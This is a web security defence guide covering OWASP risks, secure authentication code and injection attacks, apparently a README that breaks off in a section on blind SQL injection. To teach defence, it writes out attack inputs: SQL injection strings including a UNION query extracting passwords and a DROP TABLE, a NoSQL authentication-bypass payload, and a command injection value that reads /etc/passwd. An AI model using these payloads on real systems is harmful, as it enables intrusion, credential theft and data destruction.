<div align="center">

# 🔒 Web Security - Complete Defense Guide

![Security](https://img.shields.io/badge/Security-Web_Apps-red?style=for-the-badge&logo=security)
![OWASP](https://img.shields.io/badge/OWASP-Top_10-orange?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-All_Levels-green?style=for-the-badge)

### _Because security isn't optional—it's essential_ 🛡️

**One vulnerability can cost everything. Let's make sure you're protected.** 🔐

</div>

---

## 📚 Table of Contents

- [🎯 Security Fundamentals](#-security-fundamentals)
- [🔥 OWASP Top 10](#-owasp-top-10)
- [🛡️ Authentication & Authorization](#️-authentication--authorization)
- [💉 Injection Attacks](#-injection-attacks)
- [🎭 Cross-Site Scripting (XSS)](#-cross-site-scripting-xss)
- [🎪 Cross-Site Request Forgery (CSRF)](#-cross-site-request-forgery-csrf)
- [🔐 Cryptography & Encryption](#-cryptography--encryption)
- [📡 API Security](#-api-security)
- [🌐 Security Headers](#-security-headers)
- [🔍 Security Testing](#-security-testing)
- [🚨 Incident Response](#-incident-response)
- [✅ Security Checklists](#-security-checklists)

---

<div align="center">

## 🎯 Security Fundamentals

</div>

### The Security Mindset 🧠

```bash
# ═══════════════════════════════════════════
# SECURITY PRINCIPLES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   THE CIA TRIAD                            ║
╚════════════════════════════════════════════════════════════╝

🔒 Confidentiality
   • Data accessible only to authorized users
   • Encryption at rest and in transit
   • Access controls
   • Data classification

   Examples:
   ✅ HTTPS for all traffic
   ✅ Database encryption
   ✅ Role-based access control (RBAC)
   ❌ Sending passwords in plain text

🎯 Integrity
   • Data remains accurate and unaltered
   • Prevent unauthorized modifications
   • Detect tampering
   • Version control

   Examples:
   ✅ Input validation
   ✅ Checksums and hashing
   ✅ Digital signatures
   ❌ Accepting user input without sanitization

⚡ Availability
   • Systems accessible when needed
   • Prevent denial of service
   • Redundancy and backups
   • Disaster recovery

   Examples:
   ✅ Rate limiting
   ✅ Load balancing
   ✅ DDoS protection
   ❌ Single point of failure

# ═══════════════════════════════════════════
# SECURITY BY DESIGN
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   CORE PRINCIPLES                          ║
╚════════════════════════════════════════════════════════════╝

1. Defense in Depth 🏰
─────────────────────────────────────────────────────────────
Multiple layers of security controls

Example: Web Application Defense
┌─────────────────────────────────────────┐
│ 🌐 CDN/WAF (CloudFlare, AWS WAF)       │ ← Layer 1: Edge
├─────────────────────────────────────────┤
│ 🔥 Firewall (Network security groups)   │ ← Layer 2: Network
├─────────────────────────────────────────┤
│ 🚪 Load Balancer + SSL/TLS             │ ← Layer 3: Transport
├─────────────────────────────────────────┤
│ 🛡️ Application Security (Auth, RBAC)   │ ← Layer 4: App
├─────────────────────────────────────────┤
│ 🔒 Input Validation & Sanitization      │ ← Layer 5: Data
├─────────────────────────────────────────┤
│ 🗄️ Database Security (Encryption)      │ ← Layer 6: Storage
└─────────────────────────────────────────┘

If one layer fails, others still protect.

2. Least Privilege 👤
─────────────────────────────────────────────────────────────
Grant minimum necessary permissions

Examples:
✅ Database user can only read, not write
✅ API key limited to specific endpoints
✅ User sees only their own data
❌ Admin access for everyone
❌ Database credentials in frontend code

3. Fail Securely 🚫
─────────────────────────────────────────────────────────────
Fail closed, not open

// ❌ BAD: Fails open (allows access)
try {
  checkPermission(user, resource);
} catch (error) {
  // Error, but allow anyway
  return true;
}

// ✅ GOOD: Fails closed (denies access)
try {
  checkPermission(user, resource);
  return true;
} catch (error) {
  logger.error('Permission check failed', error);
  return false;
}

4. Don't Trust User Input 🚨
─────────────────────────────────────────────────────────────
Validate, sanitize, escape everything

// ❌ NEVER trust user input
const query = `SELECT * FROM users WHERE id = ${req.body.id}`;

// ✅ Always validate and sanitize
const id = parseInt(req.body.id);
if (!id || id < 1) {
  throw new Error('Invalid ID');
}
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [id]);

5. Security Through Obscurity is NOT Security 🎭
─────────────────────────────────────────────────────────────
Hiding implementation ≠ Security

❌ Bad Examples:
• Hiding admin panel at /secret-admin-xyz
• Using custom crypto algorithms
• Security by URL obfuscation
• "Nobody will find this endpoint"

✅ Good Security:
• Strong authentication
• Proper authorization
• Input validation
• Encryption
• Regular security audits

6. Keep Security Simple 🎯
─────────────────────────────────────────────────────────────
Complex systems = More vulnerabilities

✅ Use proven libraries (bcrypt, jsonwebtoken)
✅ Follow standards (OAuth 2.0, JWT)
✅ Keep dependencies updated
❌ Roll your own crypto
❌ Overly complex security logic

# ═══════════════════════════════════════════
# THREAT MODELING
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   STRIDE METHODOLOGY                       ║
╚════════════════════════════════════════════════════════════╝

S - Spoofing Identity
   Attack: Pretending to be someone else
   Example: Stolen JWT token, session hijacking
   Defense: Strong authentication, token expiration

T - Tampering with Data
   Attack: Modifying data in transit or storage
   Example: Man-in-the-middle, SQL injection
   Defense: HTTPS, input validation, integrity checks

R - Repudiation
   Attack: Denying actions performed
   Example: "I didn't make that transaction"
   Defense: Audit logs, digital signatures

I - Information Disclosure
   Attack: Exposing sensitive data
   Example: Data breaches, exposed API keys
   Defense: Encryption, access controls, secrets management

D - Denial of Service
   Attack: Making system unavailable
   Example: DDoS, resource exhaustion
   Defense: Rate limiting, load balancing, caching

E - Elevation of Privilege
   Attack: Gaining unauthorized permissions
   Example: Privilege escalation, IDOR
   Defense: Least privilege, authorization checks

Threat Modeling Process:
─────────────────────────────────────────────────────────────
1. Identify assets (data, systems, users)
2. Map attack surface (inputs, APIs, integrations)
3. Identify threats (STRIDE)
4. Rank risks (likelihood × impact)
5. Implement controls
6. Test and validate
7. Repeat regularly

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🔥 OWASP Top 10

</div>

### Critical Web Application Risks 🚨

```bash
# ═══════════════════════════════════════════
# OWASP TOP 10 (2021)
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   THE MOST DANGEROUS                       ║
╚════════════════════════════════════════════════════════════╝
```

<div align="center">

| Rank    | Vulnerability                 | Severity    | Prevalence  | Impact |
| ------- | ----------------------------- | ----------- | ----------- | ------ |
| **A01** | Broken Access Control         | 🔴 Critical | Very Common | High   |
| **A02** | Cryptographic Failures        | 🔴 Critical | Common      | High   |
| **A03** | Injection                     | 🔴 Critical | Common      | High   |
| **A04** | Insecure Design               | 🟡 High     | Common      | Medium |
| **A05** | Security Misconfiguration     | 🟡 High     | Very Common | Medium |
| **A06** | Vulnerable Components         | 🟡 High     | Common      | Medium |
| **A07** | Auth & Session Failures       | 🔴 Critical | Common      | High   |
| **A08** | Software & Data Integrity     | 🟡 High     | Uncommon    | High   |
| **A09** | Logging & Monitoring Failures | 🟢 Medium   | Common      | Low    |
| **A10** | Server-Side Request Forgery   | 🟡 High     | Uncommon    | High   |

</div>

```bash
# ═══════════════════════════════════════════
# A01: BROKEN ACCESS CONTROL
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   ACCESS CONTROL FLAWS                     ║
╚════════════════════════════════════════════════════════════╝

What is it?
─────────────────────────────────────────────────────────────
Users can access resources they shouldn't.

Common Vulnerabilities:
─────────────────────────────────────────────────────────────
• Insecure Direct Object Reference (IDOR)
• Missing function-level access control
• Elevation of privilege
• Forced browsing
• Metadata manipulation

Example: IDOR Attack
─────────────────────────────────────────────────────────────
// Vulnerable endpoint
GET /api/users/123/profile

// Attacker changes ID
GET /api/users/456/profile  // ❌ Access to other user's data!

❌ VULNERABLE CODE:
app.get('/api/users/:id/profile', async (req, res) => {
  // No authorization check!
  const user = await User.findById(req.params.id);
  res.json(user);
});

✅ SECURE CODE:
app.get('/api/users/:id/profile', auth, async (req, res) => {
  const requestedId = req.params.id;
  const currentUserId = req.user.id;

  // Check authorization
  if (requestedId !== currentUserId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const user = await User.findById(requestedId);
  res.json(user);
});

Defense Strategies:
─────────────────────────────────────────────────────────────
✅ Implement access control on every endpoint
✅ Deny by default
✅ Use centralized authorization logic
✅ Log access control failures
✅ Rate limit API requests
✅ Use UUIDs instead of sequential IDs

// Centralized authorization middleware
const authorize = (resource, action) => {
  return async (req, res, next) => {
    const user = req.user;
    const hasPermission = await checkPermission(user, resource, action);

    if (!hasPermission) {
      logger.warn('Authorization failed', {
        user: user.id,
        resource,
        action,
        ip: req.ip
      });
      return res.status(403).json({ error: 'Forbidden' });
    }

    next();
  };
};

// Usage
app.get('/api/documents/:id',
  auth,
  authorize('document', 'read'),
  async (req, res) => {
    // User is authorized
    const doc = await Document.findById(req.params.id);
    res.json(doc);
  }
);

# ═══════════════════════════════════════════
# A02: CRYPTOGRAPHIC FAILURES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   WEAK CRYPTOGRAPHY                        ║
╚════════════════════════════════════════════════════════════╝

What is it?
─────────────────────────────────────────────────────────────
Sensitive data exposed due to weak or missing encryption.

Common Issues:
─────────────────────────────────────────────────────────────
• Plain text storage of passwords
• Weak encryption algorithms
• Hard-coded keys
• Insecure random number generators
• Missing HTTPS
• Weak key derivation

❌ VULNERABLE: Plain Text Passwords
const user = {
  username: 'john',
  password: 'password123'  // ❌ NEVER!
};
await db.save(user);

✅ SECURE: Hashed Passwords (bcrypt)
const bcrypt = require('bcrypt');

// Hash password
const saltRounds = 10;
const hashedPassword = await bcrypt.hash(password, saltRounds);

const user = {
  username: 'john',
  passwordHash: hashedPassword  // ✅ Hashed
};
await db.save(user);

// Verify password
const isValid = await bcrypt.compare(inputPassword, user.passwordHash);

❌ VULNERABLE: Weak Encryption
const crypto = require('crypto');

// ❌ Weak: MD5 (broken)
const hash = crypto.createHash('md5').update(data).digest('hex');

// ❌ Weak: SHA1 (broken)
const hash = crypto.createHash('sha1').update(data).digest('hex');

✅ SECURE: Strong Encryption
// ✅ Hashing (one-way)
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 10);

// ✅ Encryption (two-way)
const crypto = require('crypto');

// Generate key
const algorithm = 'aes-256-gcm';
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);

// Encrypt
function encrypt(text) {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();
  return {
    encrypted,
    authTag: authTag.toString('hex'),
    iv: iv.toString('hex')
  };
}

// Decrypt
function decrypt(encrypted, authTag, iv) {
  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

Defense Strategies:
─────────────────────────────────────────────────────────────
✅ HTTPS everywhere (force redirect)
✅ Encrypt data at rest (database encryption)
✅ Use bcrypt/Argon2 for passwords
✅ Never store sensitive data unnecessarily
✅ Use environment variables for keys
✅ Implement key rotation
✅ Use secure random generators

// Force HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

# ═══════════════════════════════════════════
# A03: INJECTION
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   INJECTION ATTACKS                        ║
╚════════════════════════════════════════════════════════════╝

What is it?
─────────────────────────────────────────────────────────────
Malicious code injected into application through user input.

Types:
─────────────────────────────────────────────────────────────
• SQL Injection
• NoSQL Injection
• Command Injection
• LDAP Injection
• XPath Injection
• Template Injection

❌ SQL INJECTION VULNERABLE:
// Direct string concatenation
app.get('/users', async (req, res) => {
  const username = req.query.username;

  // ❌ NEVER DO THIS
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  const users = await db.query(query);

  res.json(users);
});

// Attack:
GET /users?username=admin' OR '1'='1

// Executed query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// Returns ALL users!

// Worse attack (data destruction):
GET /users?username=admin'; DROP TABLE users; --

✅ SQL INJECTION PREVENTION:
// Use parameterized queries
app.get('/users', async (req, res) => {
  const username = req.query.username;

  // ✅ Parameterized query (prepared statement)
  const query = 'SELECT * FROM users WHERE username = ?';
  const users = await db.query(query, [username]);

  res.json(users);
});

// With ORMs (Sequelize)
const users = await User.findAll({
  where: { username: req.query.username }  // ✅ Safe
});

// With ORMs (Prisma)
const users = await prisma.user.findMany({
  where: { username: req.query.username }  // ✅ Safe
});

❌ NOSQL INJECTION VULNERABLE:
// MongoDB
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // ❌ Vulnerable to NoSQL injection
  const user = await User.findOne({
    username: username,
    password: password
  });

  if (user) {
    res.json({ success: true });
  }
});

// Attack payload:
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
// Bypasses authentication!

✅ NOSQL INJECTION PREVENTION:
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // ✅ Validate input types
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  // ✅ Use proper password hashing
  const user = await User.findOne({ username });

  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ success: true });
});

// Or use mongoose strict mode
const userSchema = new mongoose.Schema({
  username: String,
  passwordHash: String
}, { strict: true });  // ✅ Rejects unknown fields

❌ COMMAND INJECTION VULNERABLE:
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;

  // ❌ NEVER DO THIS
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// Attack:
GET /ping?host=google.com; cat /etc/passwd

✅ COMMAND INJECTION PREVENTION:
// ✅ Option 1: Input validation
const isValidHost = /^[a-zA-Z0-9.-]+$/.test(host);
if (!isValidHost) {
  return res.status(400).json({ error: 'Invalid host' });
}

// ✅ Option 2: Use array syntax (safer)
const { spawn } = require('child_process');

const ping = spawn('ping', ['-c', '4', host]);
ping.stdout.on('data', (data) => {
  res.write(data);
});

// ✅ Option 3: Use libraries
const ping = require('ping');
const result = await ping.promise.probe(host);

Defense Strategies:
─────────────────────────────────────────────────────────────
✅ Use parameterized queries / prepared statements
✅ Use ORMs with built-in escaping
✅ Validate input (whitelist approach)
✅ Escape special characters
✅ Use least privilege for database users
✅ Implement Web Application Firewall (WAF)
✅ Regular security scanning

// Input validation helper
function validateInput(input, type) {
  const patterns = {
    username: /^[a-zA-Z0-9_]{3,20}$/,
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    alphanumeric: /^[a-zA-Z0-9]+$/,
    number: /^\d+$/
  };

  return patterns[type]?.test(input) || false;
}

// Usage
if (!validateInput(username, 'username')) {
  return res.status(400).json({ error: 'Invalid username' });
}

# ═══════════════════════════════════════════
# A07: AUTHENTICATION & SESSION FAILURES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   AUTH VULNERABILITIES                     ║
╚════════════════════════════════════════════════════════════╝

Common Issues:
─────────────────────────────────────────────────────────────
• Weak passwords allowed
• No rate limiting
• Predictable session IDs
• Session fixation
• Missing session expiration
• Exposed session tokens

❌ WEAK AUTHENTICATION:
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username });

  // ❌ Timing attack vulnerable
  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // ❌ Weak session ID
  req.session.userId = user.id;
  res.json({ success: true });
});

✅ SECURE AUTHENTICATION:
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');

// Rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, try again later'
});

app.post('/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;

  // Input validation
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }

  // Fetch user
  const user = await User.findOne({ username });

  // ✅ Constant-time comparison (prevents timing attacks)
  if (!user) {
    // Hash dummy password to prevent timing attack
    await bcrypt.compare(password, '$2b$10$dummy.hash.here');
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // ✅ Secure password comparison
  const isValid = await bcrypt.compare(password, user.passwordHash);

  if (!isValid) {
    // Log failed attempt
    await logFailedLogin(user.id, req.ip);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Check if account is locked
  if (user.lockUntil && user.lockUntil > Date.now()) {
    return res.status(423).json({
      error: 'Account locked. Try again later.'
    });
  }

  // ✅ Generate secure session
  const sessionId = crypto.randomBytes(32).toString('hex');
  await Session.create({
    id: sessionId,
    userId: user.id,
    expiresAt: Date.now() + (24 * 60 * 60 * 1000) // 24 hours
  });

  // Set secure cookie
  res.cookie('sessionId', sessionId, {
    httpOnly: true,    // Prevent XSS
    secure: true,      // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 24 * 60 * 60 * 1000
  });

  // Log successful login
  await logSuccessfulLogin(user.id, req.ip);

  res.json({
    success: true,
    user: {
      id: user.id,
      username: user.username,
      // Don't expose sensitive data
    }
  });
});

JWT Authentication (Stateless):
─────────────────────────────────────────────────────────────
const jwt = require('jsonwebtoken');

// Generate JWT
const token = jwt.sign(
  {
    userId: user.id,
    username: user.username,
    role: user.role
  },
  process.env.JWT_SECRET,
  {
    expiresIn: '24h',
    issuer: 'myapp.com',
    audience: 'myapp-users'
  }
);

// Verify JWT middleware
const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'myapp.com',
      audience: 'myapp-users'
    });

    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Refresh token pattern
const refreshToken = jwt.sign(
  { userId: user.id },
  process.env.REFRESH_TOKEN_SECRET,
  { expiresIn: '7d' }
);

// Store refresh token in DB (for revocation)
await RefreshToken.create({
  token: refreshToken,
  userId: user.id,
  expiresAt: Date.now() + (7 * 24 * 60 * 60 * 1000)
});

Multi-Factor Authentication (MFA):
─────────────────────────────────────────────────────────────
const speakeasy = require('speakeasy');
const qrcode = require('qrcode');

// Generate MFA secret
app.post('/mfa/setup', auth, async (req, res) => {
  const secret = speakeasy.generateSecret({
    name: `MyApp (${req.user.username})`
  });

  // Save secret to user
  await User.update(req.user.id, {
    mfaSecret: secret.base32
  });

  // Generate QR code
  const qrCodeUrl = await qrcode.toDataURL(secret.otpauth_url);

  res.json({
    secret: secret.base32,
    qrCode: qrCodeUrl
  });
});

// Verify MFA token
app.post('/mfa/verify', auth, async (req, res) => {
  const { token } = req.body;
  const user = await User.findById(req.user.id);

  const verified = speakeasy.totp.verify({
    secret: user.mfaSecret,
    encoding: 'base32',
    token: token,
    window: 2 // Allow 2 steps before/after
  });

  if (!verified) {
    return res.status(401).json({ error: 'Invalid MFA token' });
  }

  // Mark session as MFA-verified
  req.session.mfaVerified = true;
  res.json({ success: true });
});

Defense Strategies:
─────────────────────────────────────────────────────────────
✅ Enforce strong passwords
✅ Implement rate limiting
✅ Use secure session management
✅ Implement MFA for sensitive accounts
✅ Use HTTPS only
✅ Set secure cookie flags
✅ Implement account lockout
✅ Log authentication events
✅ Use proven libraries (Passport.js, Auth0)

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 🛡️ Authentication & Authorization

</div>

### Complete Auth Implementation 🔐

```bash
# ═══════════════════════════════════════════
# MODERN AUTHENTICATION
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   AUTH STRATEGIES                          ║
╚════════════════════════════════════════════════════════════╝
```

<div align="center">

| Strategy          | Type       | Use Case             | Complexity | Security   |
| ----------------- | ---------- | -------------------- | ---------- | ---------- |
| **Session-based** | Stateful   | Traditional web apps | ⭐⭐       | ⭐⭐⭐⭐   |
| **JWT**           | Stateless  | APIs, SPAs           | ⭐⭐⭐     | ⭐⭐⭐     |
| **OAuth 2.0**     | Delegation | Third-party auth     | ⭐⭐⭐⭐   | ⭐⭐⭐⭐⭐ |
| **Passport.js**   | Framework  | Multiple strategies  | ⭐⭐       | ⭐⭐⭐⭐   |
| **Auth0**         | SaaS       | Enterprise           | ⭐         | ⭐⭐⭐⭐⭐ |

</div>

```javascript
# ═══════════════════════════════════════════
# COMPLETE AUTH SYSTEM
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   USER REGISTRATION                        ║
╚════════════════════════════════════════════════════════════╝

const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { body, validationResult } = require('express-validator');
const rateLimit = require('express-rate-limit');

// Rate limiter for registration
const registerLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3, // 3 registrations per hour per IP
  message: 'Too many accounts created, try again later'
});

// Registration endpoint
app.post('/auth/register',
  registerLimiter,
  // Validation middleware
  [
    body('username')
      .isLength({ min: 3, max: 20 })
      .matches(/^[a-zA-Z0-9_]+$/)
      .withMessage('Invalid username'),
    body('email')
      .isEmail()
      .normalizeEmail()
      .withMessage('Invalid email'),
    body('password')
      .isLength({ min: 8 })
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
      .withMessage('Password must contain uppercase, lowercase, number, and special character')
  ],
  async (req, res) => {
    // Check validation errors
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    const { username, email, password } = req.body;

    try {
      // Check if user exists
      const existingUser = await User.findOne({
        $or: [{ username }, { email }]
      });

      if (existingUser) {
        return res.status(409).json({
          error: 'Username or email already exists'
        });
      }

      // Hash password
      const saltRounds = 12;
      const passwordHash = await bcrypt.hash(password, saltRounds);

      // Create user
      const user = await User.create({
        username,
        email,
        passwordHash,
        emailVerified: false,
        createdAt: new Date(),
        role: 'user'
      });

      // Generate email verification token
      const verificationToken = jwt.sign(
        { userId: user.id, type: 'email-verification' },
        process.env.JWT_SECRET,
        { expiresIn: '24h' }
      );

      // Send verification email
      await sendVerificationEmail(email, verificationToken);

      // Generate auth token
      const token = jwt.sign(
        {
          userId: user.id,
          username: user.username,
          role: user.role
        },
        process.env.JWT_SECRET,
        { expiresIn: '24h' }
      );

      // Log registration
      await auditLog.create({
        action: 'USER_REGISTERED',
        userId: user.id,
        ip: req.ip,
        userAgent: req.headers['user-agent']
      });

      res.status(201).json({
        success: true,
        token,
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          emailVerified: user.emailVerified
        }
      });

    } catch (error) {
      console.error('Registration error:', error);
      res.status(500).json({ error: 'Registration failed' });
    }
  }
);

╔════════════════════════════════════════════════════════════╗
║                   PASSWORD RESET FLOW                      ║
╚════════════════════════════════════════════════════════════╝

// Request password reset
app.post('/auth/forgot-password',
  rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 3
  }),
  [
    body('email').isEmail()
  ],
  async (req, res) => {
    const { email } = req.body;

    // Find user
    const user = await User.findOne({ email });

    // Don't reveal if user exists (security)
    if (!user) {
      return res.json({
        message: 'If account exists, reset link sent'
      });
    }

    // Generate reset token
    const resetToken = crypto.randomBytes(32).toString('hex');
    const hashedToken = crypto
      .createHash('sha256')
      .update(resetToken)
      .digest('hex');

    // Save token with expiration
    await user.update({
      resetPasswordToken: hashedToken,
      resetPasswordExpires: Date.now() + 3600000 // 1 hour
    });

    // Send email with reset link
    const resetUrl = `https://myapp.com/reset-password?token=${resetToken}`;
    await sendPasswordResetEmail(email, resetUrl);

    res.json({
      message: 'If account exists, reset link sent'
    });
  }
);

// Reset password with token
app.post('/auth/reset-password',
  [
    body('token').notEmpty(),
    body('password')
      .isLength({ min: 8 })
      .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
  ],
  async (req, res) => {
    const { token, password } = req.body;

    // Hash token to compare
    const hashedToken = crypto
      .createHash('sha256')
      .update(token)
      .digest('hex');

    // Find user with valid token
    const user = await User.findOne({
      resetPasswordToken: hashedToken,
      resetPasswordExpires: { $gt: Date.now() }
    });

    if (!user) {
      return res.status(400).json({
        error: 'Invalid or expired token'
      });
    }

    // Hash new password
    const passwordHash = await bcrypt.hash(password, 12);

    // Update password and clear reset token
    await user.update({
      passwordHash,
      resetPasswordToken: null,
      resetPasswordExpires: null
    });

    // Invalidate all sessions
    await Session.deleteMany({ userId: user.id });

    // Send confirmation email
    await sendPasswordChangedEmail(user.email);

    res.json({
      success: true,
      message: 'Password reset successful'
    });
  }
);

╔════════════════════════════════════════════════════════════╗
║                   ROLE-BASED ACCESS CONTROL (RBAC)         ║
╚════════════════════════════════════════════════════════════╝

// Permission system
const permissions = {
  user: ['read:own', 'write:own'],
  moderator: ['read:any', 'write:own', 'delete:reported'],
  admin: ['read:any', 'write:any', 'delete:any', 'manage:users']
};

// Check permission middleware
const hasPermission = (requiredPermission) => {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = permissions[userRole] || [];

    if (!userPermissions.includes(requiredPermission)) {
      return res.status(403).json({
        error: 'Insufficient permissions'
      });
    }

    next();
  };
};

// Usage
app.delete('/api/posts/:id',
  auth,
  hasPermission('delete:any'),
  async (req, res) => {
    // Only admins can delete any post
    await Post.deleteById(req.params.id);
    res.json({ success: true });
  }
);

// Resource ownership check
const isOwnerOrAdmin = async (req, res, next) => {
  const resourceId = req.params.id;
  const resource = await Resource.findById(resourceId);

  if (!resource) {
    return res.status(404).json({ error: 'Not found' });
  }

  // Check if user is owner or admin
  if (resource.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  req.resource = resource;
  next();
};

╔════════════════════════════════════════════════════════════╗
║                   OAUTH 2.0 INTEGRATION                    ║
╚════════════════════════════════════════════════════════════╝

const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const GitHubStrategy = require('passport-github2').Strategy;

// Google OAuth
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    try {
      // Find or create user
      let user = await User.findOne({ googleId: profile.id });

      if (!user) {
        user = await User.create({
          googleId: profile.id,
          email: profile.emails[0].value,
          username: profile.displayName,
          avatar: profile.photos[0].value,
          emailVerified: true // Google verifies emails
        });
      }

      return done(null, user);
    } catch (error) {
      return done(error, null);
    }
  }
));

// Routes
app.get('/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email']
  })
);

app.get('/auth/google/callback',
  passport.authenticate('google', { session: false }),
  (req, res) => {
    // Generate JWT
    const token = jwt.sign(
      { userId: req.user.id },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    // Redirect with token
    res.redirect(`https://myapp.com/auth/callback?token=${token}`);
  }
);

╔════════════════════════════════════════════════════════════╗
║                   API KEY AUTHENTICATION                   ║
╚════════════════════════════════════════════════════════════╝

// Generate API key
const generateApiKey = () => {
  return `sk_${crypto.randomBytes(32).toString('hex')}`;
};

// Create API key
app.post('/api/keys', auth, async (req, res) => {
  const { name, permissions } = req.body;

  // Generate key
  const apiKey = generateApiKey();
  const hashedKey = await bcrypt.hash(apiKey, 10);

  // Save to database
  const key = await ApiKey.create({
    userId: req.user.id,
    name,
    keyHash: hashedKey,
    permissions,
    lastUsed: null,
    createdAt: new Date()
  });

  // Return key ONCE (never stored in plain text)
  res.json({
    id: key.id,
    key: apiKey,  // Show only on creation!
    name,
    permissions
  });
});

// API key authentication middleware
const apiKeyAuth = async (req, res, next) => {
  const apiKey = req.headers['x-api-key'];

  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }

  // Find all API keys (we need to hash and compare)
  const allKeys = await ApiKey.find({ revoked: false });

  let matchedKey = null;
  for (const key of allKeys) {
    if (await bcrypt.compare(apiKey, key.keyHash)) {
      matchedKey = key;
      break;
    }
  }

  if (!matchedKey) {
    return res.status(401).json({ error: 'Invalid API key' });
  }

  // Update last used
  await matchedKey.update({ lastUsed: new Date() });

  // Attach user and key info to request
  req.user = await User.findById(matchedKey.userId);
  req.apiKey = matchedKey;

  next();
};

// Usage
app.get('/api/data', apiKeyAuth, (req, res) => {
  // Access protected resource with API key
  res.json({ data: 'secret data' });
});

═══════════════════════════════════════════════════════════
```

---

<div align="center">

## 💉 Injection Attacks

</div>

### SQL & NoSQL Injection Deep Dive 💉

```bash
# ═══════════════════════════════════════════
# INJECTION ATTACK TYPES
# ═══════════════════════════════════════════

╔════════════════════════════════════════════════════════════╗
║                   SQL INJECTION EXAMPLES                   ║
╚════════════════════════════════════════════════════════════╝

Classic SQL Injection Attacks:
─────────────────────────────────────────────────────────────

1. Authentication Bypass
─────────────────────────────────────────────────────────────
// Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

// Attack input
Username: admin' OR '1'='1' --
Password: anything

// Executed query
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
                                                ↑
                                        Always true!

Result: Logged in as admin without password!

2. Data Extraction (UNION Attack)
─────────────────────────────────────────────────────────────
// Vulnerable query
SELECT name, description FROM products WHERE id = '$id'

// Attack input
id: 1' UNION SELECT username, password FROM users --

// Executed query
SELECT name, description FROM products WHERE id = '1'
UNION SELECT username, password FROM users --'

Result: Extracts all usernames and passwords!

3. Blind SQL Injection
─────────────────────────────────────────────────────────────
// When no error messages shown

// Boolean-based
id: 1' AND 1=1 --  (returns data)
